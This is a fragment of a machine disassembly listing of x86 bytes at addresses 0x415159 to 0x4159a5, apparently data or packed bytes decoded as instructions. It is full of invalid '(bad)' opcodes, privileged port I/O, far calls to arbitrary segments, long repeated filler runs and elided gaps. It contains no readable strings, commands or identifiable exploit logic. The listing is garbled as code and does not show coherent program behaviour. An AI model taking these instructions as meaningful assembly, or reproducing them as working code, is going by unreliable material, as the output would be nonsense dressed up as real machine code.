  415159:	ins    DWORD PTR es:[edi],dx
  41515a:	loope  0x4151ae
  41515c:	pop    ecx
  41515d:	gs in  al,0x6d
  415160:	cmp    eax,0x4e331069
  415165:	jae    0x415143
  415167:	push   ebx
  415168:	out    0x4,eax
  41516a:	lock push es
  41516c:	addr16 adc esi,eax
  41516f:	push   es
  415170:	out    0x44,eax
  415172:	int3   
  415173:	imul   edx,DWORD PTR [eax],0x1b539772
  415179:	push   esi
  41517a:	(bad)  
  41517b:	push   edx
  41517c:	add    BYTE PTR [edx-0x6d],bl
  41517f:	sbb    esi,DWORD PTR es:[ebx-0x7b]
  415183:	push   0xfffffffa
  415185:	add    ecx,DWORD PTR [edi]
  415187:	fsub   st,st(7)
  415189:	xor    ebx,0x6
  41518c:	out    0x3,eax
  41518e:	mov    al,ds:0x8556d961
  415193:	push   0x33f06fc8
  415198:	(bad)  
  415199:	imul   ebx,DWORD PTR [eax+edx*2-0x38],0xb43b5355
  4151a1:	ins    BYTE PTR es:[edi],dx
  4151a2:	push   ecx
  4151a3:	push   ebp
  4151a4:	into   
  4151a5:	push   esi
  4151a6:	pop    ebp
  4151a7:	popa   
  4151a8:	mov    ebx,0xbd6e1d3f
  4151ad:	add    BYTE PTR [bx+si],al
	...
  4151c0:	dec    ebp
  4151c1:	push   eax
  4151c2:	call   0x1355:0x9952313f
  4151c9:	imul   ebx,DWORD PTR [ebx-0x65aaecc7],0xa3690d6c
  4151d3:	dec    eax
  4151d4:	sbb    BYTE PTR [edi-0x75],dl
  4151d7:	jb     0x4151db
  4151d9:	bound  eax,QWORD PTR [eax]
  4151db:	jnp    0x4151a4
  4151dd:	xor    eax,0x6b0f8468
  4151e2:	and    BYTE PTR [edi],ch
  4151e4:	add    DWORD PTR [ebx+0x64],ebp
  4151e7:	inc    esp
  4151e8:	(bad)  
  4151e9:	push   ebp
  4151ea:	add    BYTE PTR [ecx],bh
  4151ec:	shl    DWORD PTR ds:0x56170954,0x20
  4151f3:	xor    DWORD PTR [eax],ebx
  4151f5:	xor    edx,DWORD PTR [eax+0xe]
  4151f8:	jecxz  0x415222
  4151fa:	xor    ah,ah
  4151fc:	cmc    
  4151fd:	dec    esi
  4151fe:	ins    DWORD PTR es:[edi],dx
  4151ff:	cmp    bl,BYTE PTR [eax-0x6333dfe4]
  415205:	or     ecx,DWORD PTR [edx]
  415207:	sub    BYTE PTR [ebp-0x37e69c9b],dl
  41520d:	sbb    al,0x20
  41520f:	ret    
  415210:	loopne 0x41523e
  415212:	or     esi,ebx
  415214:	mov    dl,0x65
  415216:	popa   
  415217:	add    al,0xa4
  415219:	push   edx
  41521a:	sub    ebp,DWORD PTR [edx+eax*4]
  41521d:	gs ins DWORD PTR es:[edi],dx
  41521f:	add    eax,0x2365688b
	...
  415234:	add    BYTE PTR [eax],al
  415236:	int3   
  415237:	pop    edi
  415238:	les    esp,FWORD PTR fs:[ecx+0x5b]
  41523c:	fisttp QWORD PTR [bp+si+0x23]
  415240:	and    BYTE PTR [ebx],al
  415242:	std    
  415243:	gs cmp edi,ecx
  415246:	out    0x0,al
  415248:	inc    ecx
  415249:	into   
  41524a:	inc    ecx
  41524b:	pop    ebx
  41524c:	arpl   di,ax
  41524e:	pop    ds
  41524f:	and    cl,BYTE PTR [esp+eax*8+0x41]
  415253:	ins    BYTE PTR es:[edi],dx
  415254:	je     0x4151e7
  415256:	aad    0x26
  415258:	and    ecx,DWORD PTR [ebp-0x55f5fdba]
  41525e:	and    BYTE PTR [ebp+0x6e],ah
  415261:	test   BYTE PTR [ebx+ebx*2],dl
  415264:	add    BYTE PTR [bp+0x58],bh
  415268:	cmp    ah,BYTE PTR [eax]
  41526a:	jp     0x4152d2
  41526c:	imul   esi,DWORD PTR [ebx+0x74],0x5
  415270:	or     al,BYTE PTR [ebx-0x2]
  415273:	push   edi
  415274:	je     0x4152db
  415276:	pop    ds
  415277:	das    
  415278:	sub    DWORD PTR [eax+edx*8+0x3a],edx
  41527c:	popa   
  41527d:	cmp    bh,cl
  41527f:	imul   esi,DWORD PTR [eax+0x70],0x615f621d
  415286:	adc    eax,0xfe6e6b62
  41528b:	push   edi
  41528c:	pop    edi
  41528d:	je     0x415243
  41528f:	sub    DWORD PTR cs:[ebx+0x5],esi
  415293:	cmp    eax,0x5dc6161
  415298:	or     al,BYTE PTR [ebx+0x0]
	...
  4152ab:	add    dh,bh
  4152ad:	pop    eax
  4152ae:	je     0x415315
  4152b0:	out    dx,eax
  4152b1:	sub    DWORD PTR cs:[ebp+0x1f],eax
  4152b5:	imul   ebp,DWORD PTR [ebx+0x64],0x0
  4152b9:	pop    ecx
  4152ba:	arpl   WORD PTR [edx],di
  4152bc:	cmp    DWORD PTR [ebp+eiz*2+0x6e],ebp
  4152c0:	clc    
  4152c1:	cmp    al,0x75
  4152c3:	or     eax,0x656f1d13
  4152c8:	sbb    esp,DWORD PTR ds:0x57b4673d
  4152ce:	je     0x41530a
  4152d0:	stc    
  4152d1:	inc    ebp
  4152d2:	imul   edi,DWORD PTR [edx-0x50],0x65
  4152d6:	ins    BYTE PTR es:[edi],dx
  4152d7:	popa   
  4152d8:	(bad)  
  4152d9:	out    dx,al
  4152da:	sub    eax,0x5f22f930
  4152df:	outs   dx,DWORD PTR ds:[esi]
  4152e0:	lods   al,BYTE PTR ds:[esi]
  4152e1:	cmp    DWORD PTR [ebp+0x74],ebx
  4152e4:	mov    al,0x6b
  4152e6:	ins    BYTE PTR es:[edi],dx
  4152e7:	shr    BYTE PTR gs:[ecx],cl
  4152ea:	dec    ecx
  4152eb:	push   ebx
  4152ec:	pusha  
  4152ed:	dec    esp
  4152ee:	and    BYTE PTR ds:0x3911cdf0,dh
  4152f4:	rcr    BYTE PTR [edx+ebp*2+0x587d0c6e],1
  4152fb:	jno    0x4152cd
  4152fd:	(bad)  
  4152fe:	sbb    DWORD PTR [edi],esp
  415300:	cmc    
  415301:	jmp    0xa1315d14
  415306:	jo     0x415376
  415308:	cld    
  415309:	inc    edx
  41530a:	outs   dx,BYTE PTR ds:[esi]
  41530b:	je     0x41532a
  41530d:	and    al,0x67
  41530f:	outs   dx,BYTE PTR ds:[esi]
	...
  415320:	add    BYTE PTR [eax],al
  415322:	iret   
  415323:	xor    ebp,DWORD PTR [edx+edi*1-0x10]
  415327:	rep ins BYTE PTR es:[edi],dx
  415329:	popa   
  41532a:	rcl    DWORD PTR [ebx],1
  41532c:	imul   ebp,DWORD PTR [ebp-0x22],0x9
  415330:	add    al,0x45
  415332:	lods   eax,DWORD PTR ds:[esi]
  415333:	repz and esp,DWORD PTR [ebx]
  415336:	ret    
  415337:	dec    DWORD PTR [ebx+0x54]
  41533a:	pushf  
  41533b:	cvtps2pi mm5,QWORD PTR [edi]
  41533e:	fisubr WORD PTR [edi+0xcb80a10]
  415344:	push   ecx
  415345:	je     0x415321
  415347:	mov    edi,0xd9e57128
  41534c:	inc    esp
  41534d:	popa   
  41534e:	xchg   ebx,eax
  41534f:	or     dl,BYTE PTR [esp+esi*2-0x36]
  415353:	mov    edi,0xb2ca2d27
  415358:	pop    es
  415359:	aas    
  41535a:	xchg   ebx,eax
  41535b:	shr    BYTE PTR [eax+0x70],0x64
  41535f:	add    eax,DWORD PTR [edi+0x6e]
  415362:	push   ebx
  415363:	int    0x65
  415365:	addr16 dec esi
  415367:	int    0x17
  415369:	and    BYTE PTR [ecx-0x3e],cl
  41536c:	push   0x55b7446e
  415371:	ja     0x415387
  415373:	(bad)  
  415374:	sub    DWORD PTR [ecx],edi
  415376:	inc    ecx
  415377:	jecxz  0x41538a
  415379:	or     ebp,edx
  41537b:	push   es
  41537c:	stos   BYTE PTR es:[edi],al
  41537d:	outs   dx,BYTE PTR ds:[esi]
  41537e:	push   ds
  41537f:	test   BYTE PTR gs:[edx+0x1c],ah
  415383:	pop    esi
  415384:	xchg   BYTE PTR [ebp+0x0],ch
	...
  415397:	add    dl,bl
  415399:	mov    ch,BYTE PTR es:[edi+0x5]
  41539d:	pop    eax
  41539e:	mov    WORD PTR [eax],ss
  4153a0:	cli    
  4153a1:	cmp    DWORD PTR [edx+0x68],edi
  4153a4:	add    ah,BYTE PTR [edx]
  4153a6:	test   al,0x66
  4153a8:	adc    esp,DWORD PTR [ebp+0x73]
  4153ab:	sbb    eax,edx
  4153ad:	inc    ecx
  4153ae:	push   esi
  4153af:	pop    edx
  4153b0:	xlat   BYTE PTR ds:[ebx]
  4153b1:	bound  ecx,QWORD PTR [ebx+0x65]
  4153b4:	adc    eax,0x1014051b
  4153b9:	pop    ds
  4153ba:	dec    edx
  4153bb:	outs   dx,DWORD PTR ds:[esi]
  4153bc:	retf   
  4153bd:	push   esi
  4153be:	dec    eax
  4153bf:	pop    eax
  4153c0:	xlat   BYTE PTR ds:[ebx]
  4153c1:	push   0x2709694b
  4153c6:	and    al,0x33
  4153c8:	mov    bh,0x49
  4153ca:	pop    es
  4153cb:	sbb    DWORD PTR [esi],eax
  4153cd:	pop    ss
  4153ce:	loop   0x4153f3
  4153d0:	lds    ebx,FWORD PTR [ebp+0xd]
  4153d3:	push   0x241a5b95
  4153d8:	out    0xe,eax
  4153da:	rcl    BYTE PTR [eax],0xea
  4153dd:	add    ecx,esi
  4153df:	add    ebx,esi
  4153e1:	push   es
  4153e2:	int    0x2d
  4153e4:	lock xor al,cl
  4153e7:	sub    eax,0x2dc106ca
  4153ec:	retf   0xd506
  4153ef:	push   0x6cd76664
  4153f4:	and    DWORD PTR [ecx],ebx
  4153f6:	add    eax,0xe7634c68
  4153fb:	dec    ebp
	...
  41540c:	add    BYTE PTR [eax],al
  41540e:	push   ebx
  41540f:	pop    ebx
  415410:	test   al,0x53
  415412:	push   edi
  415413:	dec    ecx
  415414:	mov    ah,0x65
  415416:	dec    esi
  415417:	push   0x0
  415419:	mov    ebx,0xc4635935
  41541e:	repz inc esp
  415420:	arpl   WORD PTR [ebp-0x649caa18],bx
  415426:	cmp    BYTE PTR [ebp+0x73],ah
  415429:	test   bl,dh
  41542b:	push   es
  41542c:	ins    DWORD PTR es:[edi],dx
  41542d:	jge    0x415437
  41542f:	push   ss
  415430:	xor    dl,bh
  415432:	pop    ss
  415433:	arpl   WORD PTR [ecx+ebp*8-0x3e],bp
  415437:	pop    edx
  415438:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41543a:	and    ebp,DWORD PTR [eax+0x6e]
  41543d:	call   0x67d5:0x4872621f
  415444:	add    cl,ch
  415446:	shr    BYTE PTR [edx+0x76],cl
  415449:	dec    eax
  41544a:	les    ebp,FWORD PTR [ebx+0x31]
  41544d:	sbb    eax,DWORD PTR [esi]
  41544f:	imul   ebp,DWORD PTR [ebp+edx*2-0xc],0x13
  415454:	ins    BYTE PTR es:[edi],dx
  415455:	dec    ebp
  415456:	aad    0x65
  415458:	pop    edi
  415459:	cmp    eax,0x456e13d7
  41545e:	stos   DWORD PTR es:[edi],eax
  41545f:	fs addr16 sbb eax,0x106c339b
  415466:	retf   0x5167
  415469:	add    BYTE PTR [eax-0x70febefa],cl
  41546f:	imul   ebx,DWORD PTR gs:0x0,0x0
	...
  415482:	add    BYTE PTR [eax],al
  415484:	popf   
  415485:	pop    ebp
  415486:	arpl   WORD PTR [edi],cx
  415488:	mov    bh,0x67
  41548a:	imul   ecx,DWORD PTR [ebx],0xffffff97
  41548d:	pop    eax
  41548e:	jno    0x415491
  415490:	mov    edx,DWORD PTR [esi+0x0]
  415493:	scas   eax,DWORD PTR es:[edi]
  415494:	inc    ecx
  415495:	data16 arpl WORD PTR [edx-0x55ff94a6],di
  41549c:	inc    ecx
  41549d:	data16 movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4154a0:	inc    ebp
  4154a1:	push   esi
  4154a2:	imul   eax,DWORD PTR [eax],0xffffffbc
  4154a5:	cmp    BYTE PTR [ebp+0x74],bl
  4154a8:	lods   al,BYTE PTR ds:[esi]
  4154a9:	inc    ebp
  4154aa:	add    BYTE PTR [ebx+0x7b],al
  4154ad:	imul   esp,DWORD PTR [esi+eax*2+0x7b],0x5a006169
  4154b5:	cmp    BYTE PTR [ebp+0x70],dh
  4154b8:	jge    0x415505
  4154ba:	popa   
  4154bb:	je     0x415519
  4154bd:	aaa    
  4154be:	popa   
  4154bf:	jb     0x415513
  4154c1:	imul   esi,DWORD PTR [ebp+0x0],0x7075385a
  4154c8:	std    
  4154c9:	dec    eax
  4154ca:	js     0x41553c
  4154cc:	jbe    0x415506
  4154ce:	je     0x41551b
  4154d0:	ins    BYTE PTR es:[edi],dx
  4154d1:	sub    eax,0x2dcb4300
  4154d6:	jo     0x41554c
  4154d8:	or     eax,0xbb746f6a
  4154dd:	arpl   WORD PTR [ebp+0x4b],si
  4154e0:	lods   al,BYTE PTR ds:[esi]
  4154e1:	sub    eax,0x2e0b4300
  4154e6:	jo     0x41555c
	...
  4154f8:	add    BYTE PTR [eax],al
  4154fa:	jmp    0x415565
  4154fc:	ins    BYTE PTR es:[edi],dx
  4154fd:	gs test al,0x37
  415500:	popa   
  415501:	inc    ebx
  415502:	mul    BYTE PTR [eax+0x74]
  415505:	shr    DWORD PTR gs:[esi],1
  415508:	add    BYTE PTR [edx-0x14],dl
  41550b:	cmp    BYTE PTR [ecx+0x72],ah
  41550e:	std    
  41550f:	push   cs
  415510:	imul   edx,DWORD PTR [ebx-0x14],0x56
  415514:	data16 add dh,al
  415517:	cmp    ah,BYTE PTR [ecx+0x6e]
  41551a:	jmp    0xeca4c053
  41551f:	aaa    
  415520:	outs   dx,DWORD PTR ds:[esi]
  415521:	push   esp
  415522:	neg    BYTE PTR [esi+0x61]
  415525:	outs   dx,BYTE PTR ds:[esi]
  415526:	fnstcw WORD PTR [ecx+ebp*2]
  415529:	jo     0x4154d7
  41552b:	aaa    
  41552c:	outs   dx,DWORD PTR ds:[esi]
  41552d:	outs   dx,DWORD PTR ds:[esi]
  41552e:	lock leave 
  415530:	bound  esi,QWORD PTR [ebp+ecx*2+0x74]
  415534:	ins    BYTE PTR es:[edi],dx
  415535:	gs push edi
  415537:	ret    
  415538:	gs dec ebp
  41553a:	push   esi
  41553b:	jnp    0x41558d
  41553d:	arpl   WORD PTR [edx-0x20],ax
  415540:	inc    esp
  415541:	arpl   WORD PTR [esp+edi*2],di
  415544:	ins    BYTE PTR es:[edi],dx
  415545:	imul   edx,DWORD PTR ds:0xe6e4a7a,0x116b4f81
  41554f:	je     0x4155bb
  415551:	ins    DWORD PTR es:[edi],dx
  415552:	push   es
  415553:	loopne 0x415595
  415555:	ins    DWORD PTR es:[edi],dx
  415556:	push   ds
  415557:	push   edx
  415558:	data16 jb 0x415557
  41555b:	ins    BYTE PTR es:[edi],dx
  41555c:	push   0x64
	...
  41556e:	add    BYTE PTR [eax],al
  415570:	and    al,0x89
  415572:	xor    BYTE PTR [edx+eax*1-0x79],dh
  415576:	imul   esp,DWORD PTR [ebp-0x3d],0x36
  41557a:	pusha  
  41557b:	aas    
  41557c:	lock and ebp,DWORD PTR [ecx+0x65]
  415580:	iret   
  415581:	dec    ecx
  415582:	das    
  415583:	jno    0x415552
  415585:	sub    eax,0x38bc0043
  41558a:	imul   ebp,DWORD PTR [ecx-0x43],0xc972340f
  415591:	adc    DWORD PTR [ebx+0x6c],ebp
  415594:	int    0x48
  415596:	pop    edi
  415597:	push   esi
  415598:	xchg   ecx,eax
  415599:	sti    
  41559a:	dec    esi
  41559b:	arpl   WORD PTR [ecx-0x759bbb21],si
  4155a1:	repnz push esp
  4155a3:	je     0x415561
  4155a5:	shr    BYTE PTR [esi+0x63],1
  4155a8:	sahf   
  4155a9:	out    dx,eax
  4155aa:	push   ebp
  4155ab:	addr16 jle 0x4155a4
  4155ae:	arpl   WORD PTR [bx+0x5502],dx
  4155b3:	add    al,dh
  4155b5:	cld    
  4155b6:	push   ebp
  4155b7:	ja     0x415619
  4155b9:	pop    es
  4155ba:	fist   DWORD PTR [esi]
  4155bc:	and    ah,BYTE PTR [ecx]
  4155be:	ret    
  4155bf:	addr16 dec esp
  4155c1:	pop    es
  4155c2:	stos   BYTE PTR es:[edi],al
  4155c3:	pusha  
  4155c4:	bound  ebx,QWORD PTR [ebx-0x62]
  4155c7:	push   ebx
  4155c8:	push   ebx
  4155c9:	popa   
  4155ca:	call   0x2168:0xc45b415c
  4155d1:	pop    ebx
  4155d2:	(bad)  
  4155d3:	push   ebp
	...
  4155e4:	add    BYTE PTR [eax],al
  4155e6:	push   ebx
  4155e7:	inc    esi
  4155e8:	out    0x46,eax
  4155ea:	adc    edx,DWORD PTR [ebp-0x65]
  4155ed:	inc    eax
  4155ee:	push   ss
  4155ef:	pop    edx
  4155f0:	mov    WORD PTR [esi+0x13],es
  4155f3:	push   ebp
  4155f4:	fwait
  4155f5:	ins    BYTE PTR es:[edi],dx
  4155f6:	push   cs
  4155f7:	pop    esi
  4155f8:	mov    ah,BYTE PTR [esp+eax*1+0x6a]
  4155fc:	jp     0x41564a
  4155fe:	push   ss
  4155ff:	xor    al,0x73
  415601:	push   0x2
  415603:	push   0xffffffe7
  415605:	inc    esi
  415606:	adc    edx,DWORD PTR [ebp+0x73]
  415609:	inc    esi
  41560a:	fcomp  QWORD PTR [edi+0x5a]
  41560d:	popa   
  41560e:	rcr    DWORD PTR [edx+0x4e],0x56
  415612:	rol    DWORD PTR [esi],cl
  415614:	sub    dl,BYTE PTR [esi-0x21]
  415617:	push   esi
  415618:	push   ebx
  415619:	inc    ebp
  41561a:	rcl    DWORD PTR [ebp+0x3c],1
  41561d:	ins    DWORD PTR es:[edi],dx
  41561e:	ret    0x2a69
  415621:	popa   
  415622:	ret    0x405a
  415625:	(bad)  
  415626:	iret   
  415627:	arpl   WORD PTR [eax+0x50],cx
  41562a:	xchg   ebx,eax
  41562b:	sbb    DWORD PTR ss:[ebp-0x62],ebp
  41562f:	adc    esp,DWORD PTR gs:[ecx-0x57]
  415633:	imul   edx,DWORD PTR [eax],0xe706f004
  415639:	add    esi,eax
  41563b:	push   es
  41563c:	out    0x3,eax
  41563e:	lock push es
  415640:	out    0x3,eax
  415642:	lock push es
  415644:	add    cl,ch
  415646:	repz push es
  415648:	add    cl,ch
	...
  41565a:	add    BYTE PTR [eax],al
  41565c:	repz push es
  41565e:	add    cl,ch
  415660:	repz push es
  415662:	add    cl,ch
  415664:	repz push es
  415666:	add    cl,ch
  415668:	repz push es
  41566a:	add    cl,ch
  41566c:	repz push es
  41566e:	add    cl,ch
  415670:	repz push es
  415672:	add    cl,ch
  415674:	repz push es
  415676:	add    cl,ch
  415678:	repz push es
  41567a:	add    cl,ch
  41567c:	repz push es
  41567e:	add    cl,ch
  415680:	repz push es
  415682:	add    cl,ch
  415684:	repz push es
  415686:	add    cl,ch
  415688:	repz push es
  41568a:	add    cl,ch
  41568c:	repz push es
  41568e:	add    cl,ch
  415690:	repz push es
  415692:	add    cl,ch
  415694:	repz push es
  415696:	add    cl,ch
  415698:	repz push es
  41569a:	add    cl,ch
  41569c:	repz push es
  41569e:	add    cl,ch
  4156a0:	repz push es
  4156a2:	add    cl,ch
  4156a4:	repz push es
  4156a6:	add    cl,ch
  4156a8:	repz push es
  4156aa:	dec    eax
  4156ab:	ss mov ebx,0xe742004a
  4156b1:	push   ss
  4156b2:	cmp    BYTE PTR [ecx],ah
  4156b4:	pop    ss
  4156b5:	and    al,0x30
  4156b7:	std    
  4156b8:	sti    
  4156b9:	sbb    esp,DWORD PTR [ebx]
  4156bb:	stc    
  4156bc:	jmp    FWORD PTR [esi]
  4156be:	sub    ecx,esp
	...
  4156d0:	add    BYTE PTR [eax],al
  4156d2:	add    edx,DWORD PTR ds:0x1503c458
  4156d8:	pop    eax
  4156d9:	(bad)  
  4156da:	not    BYTE PTR [esi]
  4156dc:	xor    dh,BYTE PTR [ecx]
  4156de:	out    dx,eax
  4156df:	push   ss
  4156e0:	xor    al,BYTE PTR [eax]
  4156e2:	shr    edi,1
  4156e4:	das    
  4156e5:	xor    dl,cl
  4156e7:	out    dx,eax
  4156e8:	das    
  4156e9:	xor    ah,cl
  4156eb:	out    dx,eax
  4156ec:	das    
  4156ed:	xor    al,BYTE PTR [ecx]
  4156ef:	out    dx,al
  4156f0:	das    
  4156f1:	xor    dh,BYTE PTR [ecx-0x4bb8ffcb]
  4156f7:	ds dec esi
  4156f9:	popa   
  4156fa:	mov    ch,0x61
  4156fc:	jbe    0x415763
  4156fe:	mov    dh,BYTE PTR [ecx]
  415700:	outs   dx,DWORD PTR ds:[esi]
  415701:	je     0x4156b7
  415703:	gs inc ebp
  415705:	outs   dx,BYTE PTR ds:[esi]
  415706:	mov    bh,0x5f
  415708:	add    BYTE PTR [ebx-0x5c],ch
  41570b:	xor    al,0x6e
  41570d:	gs ins DWORD PTR es:[edi],dx
  41570f:	repz xor DWORD PTR [esi],ebp
  415712:	jne    0x41577a
  415714:	ins    BYTE PTR es:[edi],dx
  415715:	add    BYTE PTR [eax+0x33],ah
  415718:	push   ebx
  415719:	outs   dx,DWORD PTR ds:[esi]
  41571a:	jbe    0x415714
  41571c:	xor    edx,DWORD PTR [eax+0x6b]
  41571f:	pop    edi
  415720:	pop    edi
  415721:	or     dh,BYTE PTR gs:[ebx]
  415724:	add    BYTE PTR [ebx+0x6e],dl
  415727:	push   0x34687774
  41572c:	popa   
  41572d:	pop    esp
  41572e:	xchg   edi,eax
  41572f:	imul   esi,DWORD PTR [edx+0x5c],0x67715f29
	...
  415746:	add    BYTE PTR [eax],al
  415748:	shl    BYTE PTR [eax+0x6f],0x5c
  41574c:	pop    es
  41574d:	pop    ss
  41574e:	push   eax
  41574f:	pop    esp
  415750:	adc    DWORD PTR [eax+0x6f],esp
  415753:	je     0x41575f
  415755:	add    ecx,DWORD PTR [edi+0x6f]
  415758:	mov    bh,0x36
  41575a:	jae    0x4157bd
  41575c:	sti    
  41575d:	sub    eax,0x34b8465c
  415762:	xor    bl,BYTE PTR [ecx+ebp*8+0x5e]
  415766:	jno    0x4157cf
  415768:	add    BYTE PTR [ecx+0x6f],ah
  41576b:	pop    esp
  41576c:	lock sbb eax,0x27ac5030
  415772:	addr16 jno 0x4157f1
  415775:	rol    BYTE PTR [ecx],1
  415777:	push   ecx
  415778:	pop    DWORD PTR ds:0xd1917550
  41577e:	pop    esi
  41577f:	pop    esp
  415780:	call   DWORD PTR ss:[ebp+0x5c]
  415784:	inc    ebx
  415785:	mov    edi,0xa454634f
  41578a:	push   0x5f
  41578c:	inc    esp
  41578d:	lds    esp,FWORD PTR [eax+0x48]
  415790:	pop    ecx
  415791:	mov    cl,0x4d
  415793:	ins    DWORD PTR es:[edi],dx
  415794:	inc    edx
  415795:	(bad)  
  415796:	xor    eax,0x49702446
  41579b:	ins    DWORD PTR es:[edi],dx
  41579c:	inc    ebx
  41579d:	mov    WORD PTR [ecx],es
  41579f:	push   ecx
  4157a0:	pop    ds
  4157a1:	(bad)  
  4157a2:	dec    ebp
  4157a3:	jne    0x4157b6
  4157a5:	jb     0x415805
  4157a7:	pop    esp
  4157a8:	ss jg  0x4157fe
  4157ab:	xor    al,BYTE PTR [eax]
	...
  4157bd:	add    BYTE PTR [ecx+edx*4],dh
  4157c0:	bound  esi,QWORD PTR [esi+0x15]
  4157c3:	test   BYTE PTR ds:0x68741167,bh
  4157c9:	sub    BYTE PTR gs:[edi+0x54],dh
  4157cd:	je     0x4157d6
  4157cf:	push   edx
  4157d0:	pop    edx
  4157d1:	pop    esp
  4157d2:	mov    dh,0x73
  4157d4:	xor    DWORD PTR [eax-0x29],ecx
  4157d7:	xor    BYTE PTR [eax+0x0],dl
  4157da:	sar    BYTE PTR [esi],0x51
  4157dd:	jno    0x4157be
  4157df:	inc    esp
  4157e0:	push   edx
  4157e1:	fs lock daa 
  4157e4:	gs jno 0x4157a3
  4157e7:	adc    eax,0xdfd56b63
  4157ec:	xor    BYTE PTR [ecx-0x33],dh
  4157ef:	adc    DWORD PTR [esp+ecx*2],eax
  4157f2:	cdq    
  4157f3:	or     eax,0x69f005f
  4157f8:	or     bl,BYTE PTR [ebp+edi*4+0x64]
  4157fc:	adc    edx,DWORD PTR [esi+eax*8+0x5f]
  415800:	add    eax,0x262af06d
  415805:	dec    esp
  415806:	scas   eax,DWORD PTR es:[edi]
  415807:	cmp    DWORD PTR [ebx],esi
  415809:	inc    ecx
  41580a:	mov    ds:0x81663006,al
  41580f:	push   edx
  415810:	or     BYTE PTR [eax+0x5c],ch
  415813:	inc    ebx
  415814:	add    BYTE PTR [edx-0x10],dl
  415817:	inc    esp
  415818:	fist   DWORD PTR [ebx+0x37]
  41581b:	pop    ebp
  41581c:	rol    BYTE PTR [ebp+0x37],1
  41581f:	pop    edx
  415820:	int3   
  415821:	add    eax,DWORD PTR [eax]
	...
  415833:	add    BYTE PTR [ecx],ah
  415835:	pop    esp
  415836:	lds    ecx,FWORD PTR [edi+0x3d]
  415839:	mov    cx,0x1c60
  41583d:	inc    esp
  41583e:	iret   
  41583f:	ins    BYTE PTR es:[edi],dx
  415840:	inc    ecx
  415841:	pop    ebx
  415842:	int3   
  415843:	push   ecx
  415844:	dec    esp
  415845:	xor    al,0xc0
  415847:	gs or  al,0x5c
  41584a:	sahf   
  41584b:	push   edx
  41584c:	rol    BYTE PTR [edi-0x72],1
  41584f:	push   0x5f85660b
  415854:	adc    ebx,DWORD PTR [ecx-0x19]
  415857:	xor    dl,BYTE PTR ds:0x1f4e7b65
  41585d:	pop    ecx
  41585e:	test   BYTE PTR [edi],dh
  415860:	sub    eax,0xdc52805f
  415865:	popa   
  415866:	jns    0x41589f
  415868:	mov    esp,0xcc655b5b
  41586d:	sub    ah,BYTE PTR es:[edi-0x35]
  415871:	pop    ecx
  415872:	dec    eax
  415873:	data16 aam 0x61
  415876:	pop    ecx
  415877:	add    al,0xa4
  415879:	cmp    eax,0x5dc55337
  41587e:	xor    esp,DWORD PTR [ebx-0x38]
  415881:	push   es
  415882:	add    BYTE PTR [edx],bl
  415884:	popf   
  415885:	push   edx
  415886:	arpl   WORD PTR [edx],di
  415888:	call   0xc471b493
  41588d:	push   ebp
  41588e:	jne    0x4158a0
  415890:	shl    BYTE PTR [ebp+0x68],0x35
  415894:	fbstp  TBYTE PTR ds:0x275d
	...
  4158aa:	shl    BYTE PTR [esi],0x0
  4158ad:	and    eax,0xcf6e63af
  4158b2:	test   BYTE PTR [edi+eiz*2-0x17],bl
  4158b6:	adc    eax,0xec006e64
  4158bb:	xor    DWORD PTR [ecx-0x3a],edx
  4158be:	sbb    eax,0x17e95033
  4158c3:	inc    esp
  4158c4:	push   edx
  4158c5:	jmp    0xa587a0d9
  4158ca:	xor    al,0x39
  4158cc:	add    BYTE PTR [edx-0x58bccd00],ch
  4158d2:	pop    es
  4158d3:	aaa    
  4158d4:	add    BYTE PTR [eax-0x4598c0ce],bl
  4158da:	aaa    
  4158db:	pop    edx
  4158dc:	jb     0x41587e
  4158de:	repz xor eax,0x5227876d
  4158e4:	pop    edi
  4158e5:	fwait
  4158e6:	adc    BYTE PTR [ebx],ch
  4158e8:	inc    ebp
  4158e9:	jge    0x4158f9
  4158eb:	imul   ebx,DWORD PTR [edi-0x6b],0x993f45c2
  4158f2:	xor    BYTE PTR [ebx],ch
  4158f4:	inc    ecx
  4158f5:	jl     0x4158b6
  4158f7:	addr16 inc esi
  4158f9:	xchg   ebp,eax
  4158fa:	and    esp,DWORD PTR [edi]
  4158fc:	or     DWORD PTR ss:[ecx+ebx*2+0x3c18446b],ebp
  415904:	inc    ecx
  415905:	cmp    eax,0x4b6c59d5
  41590a:	rcr    DWORD PTR [eax+0x0],cl
	...
  41591d:	add    BYTE PTR [eax],al
  41591f:	add    dl,bl
  415921:	popa   
  415922:	data16 je 0x415923
  415925:	addr16 jb 0x41598d
  415928:	add    eax,0xbb6f6c0a
  41592d:	ins    BYTE PTR es:[di],dx
  41592f:	push   ebx
  415930:	retf   0x5047
  415933:	inc    ebp
  415934:	aad    0x45
  415936:	jno    0x4159ac
  415938:	cld    
  415939:	or     al,0x54
  41593b:	push   eax
  41593c:	cmp    ecx,edi
  41593e:	pop    ds
  41593f:	push   eax
  415940:	sti    
  415941:	popa   
  415942:	data16 gs cli 
  415945:	xor    eax,0x65f76f65
  41594a:	ins    BYTE PTR es:[edi],dx
  41594b:	pop    esp
  41594c:	or     BYTE PTR [eax+0x54],cl
  41594f:	outs   dx,DWORD PTR ds:[esi]
  415950:	(bad)  
  415951:	bound  esp,QWORD PTR [edx+0x61]
  415954:	mov    ebx,0xbf6f4f06
  415959:	cmp    dh,BYTE PTR [ebx+0x61]
  41595c:	stos   DWORD PTR es:[edi],eax
  41595d:	sub    DWORD PTR [edi+eax*2-0x5b],ebx
  415961:	arpl   WORD PTR [edx+0x61],sp
  415964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415965:	pop    ss
  415966:	aas    
  415967:	inc    ecx
  415968:	mov    DWORD PTR [ecx],ecx
  41596a:	pop    esp
  41596b:	inc    ebx
  41596c:	pop    esp
  41596d:	cmp    ah,BYTE PTR [ecx+0x46]
  415970:	pop    ebp
  415971:	push   ss
  415972:	and    BYTE PTR [edi],dh
  415974:	test   eax,0x7c6d6b3e
  415979:	adc    cl,BYTE PTR [ebp+0x43]
  41597c:	cmp    eax,0x6b6c6b63
  415981:	gs jb  0x415984
	...
  415994:	add    BYTE PTR [eax],al
  415996:	pop    edx
  415997:	arpl   WORD PTR [esi+0x74],sp
  41599a:	out    dx,al
  41599b:	fs jb  0x415a03
  41599e:	jne    0x4159ab
  4159a0:	ins    BYTE PTR es:[edi],dx
  4159a1:	outs   dx,DWORD PTR ds:[esi]
  4159a2:	stos   DWORD PTR es:[edi],eax
  4159a3:	gs ins BYTE PTR es:[edi],dx
  4159a5:	push   ebx
